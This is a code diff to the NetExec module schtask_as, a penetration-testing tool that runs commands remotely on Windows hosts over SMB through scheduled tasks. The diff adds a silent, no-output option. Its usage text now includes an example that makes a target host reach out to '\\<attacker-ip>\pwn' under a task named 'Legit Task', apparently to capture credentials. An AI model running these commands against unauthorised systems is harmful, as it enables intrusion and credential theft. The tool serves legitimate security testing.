@@ -9,6 +9,7 @@ class NXCModule:
     Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
     Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
     Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
+    Modified by @SGMG11 to execute the task without output
     """
 
     def options(self, context, module_options):
@@ -19,16 +20,19 @@ class NXCModule:
         TASK           OPTIONAL: Set a name for the scheduled task name
         FILE           OPTIONAL: Set a name for the command output file
         LOCATION       OPTIONAL: Set a location for the command output file (e.g. 'C:\\Windows\\Temp\\')
+        SILENTCOMMAND  OPTIONAL: Do not retrieve output
 
         Example:
         -------
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe
+        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='dir \\<attacker-ip>\pwn' TASK='Legit Task' SILENTCOMMAND='True'
         """
         self.command_to_run = self.binary_to_upload = self.run_task_as = self.task_name = self.output_filename = self.output_file_location = self.time = None
         self.share = "C$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_path = self.tmp_dir.split(":")[1]
+        self.show_output = True
 
         if "CMD" in module_options:
             self.command_to_run = module_options["CMD"]
@@ -49,6 +53,10 @@ class NXCModule:
             # Ensure trailing backslashes
             self.output_file_location = module_options["LOCATION"].rstrip("\\") + "\\"
 
+        if "SILENTCOMMAND" in module_options:
+            if module_options["SILENTCOMMAND"] == "True":
+                self.show_output = False
+
     name = "schtask_as"
     description = "Remotely execute a scheduled task as a logged on user"
     supported_protocols = ["smb"]
@@ -63,6 +71,9 @@ class NXCModule:
         if self.run_task_as is None:
             self.logger.fail("You need to specify a USER to run the command as")
             return
+
+        if self.show_output == "False":
+            self.logger.display("Command will be executed silently without output")
 
         if self.binary_to_upload:
             if not os.path.isfile(self.binary_to_upload):
@@ -103,8 +114,8 @@ class NXCModule:
                 self.output_file_location,
             )
 
-            self.logger.display(f"Executing {self.command_to_run} as {self.run_task_as}")
-            output = exec_method.execute(self.command_to_run, True)
+            self.logger.display(f"Executing {self.command_to_run} as {self.run_task_as} with output set to {self.show_output}")
+            output = exec_method.execute(self.command_to_run, self.show_output)
 
             try:
                 if not isinstance(output, str):
